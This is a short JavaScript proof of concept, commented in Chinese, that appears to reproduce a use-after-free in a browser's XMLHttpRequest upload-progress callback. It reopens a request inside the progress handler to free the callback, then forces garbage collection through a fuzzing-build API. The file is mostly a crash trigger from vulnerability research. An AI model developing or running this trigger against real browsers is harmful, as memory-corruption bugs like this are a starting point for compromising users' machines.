var ttime=0;

function spin() {
    ttime++;
    console.log("spin start " + ttime);
    var x=new XMLHttpRequest();
    x.open("POST","https://mozilla.org/",false);
    // XMLHttpRequest.send(body)返回为undefined
    try{x.send("X");}
    catch(e){
        // console.log("send error 1111111111");
        // console.log(e);
    }
}
function start() {
    console.log("start")
	post_body=document.documentElement;
	get_xhr=new XMLHttpRequest();
    post_xhr=new XMLHttpRequest();
	get_xhr.open('GET','/a'+ "a".repeat(204811),true);

    // console.log(get_xhr.readyState)
    // console.log("post_xhr state: " + post_xhr.readyState)
	get_xhr.onreadystatechange=fun0;
    try{
        get_xhr.send(undefined);
    }catch(e){
        // console.log("send error");
        // console.log(e);
    }
    get_xhr.onload=function(e){
        console.log(this.response)
    }

    // console.log("type:" + get_xhr.responseType);
    // console.log(get_xhr.readyState);
	
    // console.log("post_xhr state: " + post_xhr.readyState);

	post_upload=post_xhr.upload;
	post_upload.onprogress=fun1;
    // console.log("end");
    // console.log(get_xhr.readyState);
}

var x=0;
function fun0() {
    console.log("fun0 start");
    // console.log("post_xhr state: " + post_xhr.readyState);
    // console.log('/x' + "a".repeat(204811));
    try{
        if(x!=0){
            return;
        }
        x++;
        post_xhr.open('POST','/x' + "a".repeat(204811),true);
        // post_xhr.open('POST',"2.txt",true);
        // post_xhr.open('POST','1.txt',true);
        // console.log("post_xhr state: " + post_xhr.readyState);
        // console.log("post body:" + post_body);
        post_xhr.send(post_body);
        // console.log(get_xhr.readyState);
        // console.log("post_xhr state: " + post_xhr.readyState);
    }catch(e){
        // console.log("error");

    }
    // console.log("post_xhr state: " + post_xhr.readyState)
}

function fun1() {
    console.log("fun1 start");
    
    // window.dump(1);


    //这两行改变了post_xhr的属性，使得post_upload这个timer触发了其他动作，然后重新调用Fire函数，释放之前的callback
	post_xhr.open('GET','/a'+'a'.repeat(101111),true);
	post_xhr.send(undefined);


    // for(var x=0;x<10;x++) spin();
    // spin();

    //如果没有这个延时操作，那么当第一个callback gc的时候，可能第二次Fire还没有执行到，所以没有gc到第一个callback
    var x = new XMLHttpRequest();
    x.open("GET","www.baidu.com",false);
    try{x.send("x");} catch(e){}

    
    //重置null的同时调用gc
    post_xhr = null;
    post_upload = null;
    get_xhr = null;
    post_body = null;
    FuzzingFunctions.garbageCollect();FuzzingFunctions.cycleCollect();
    console.log("gc success!");

}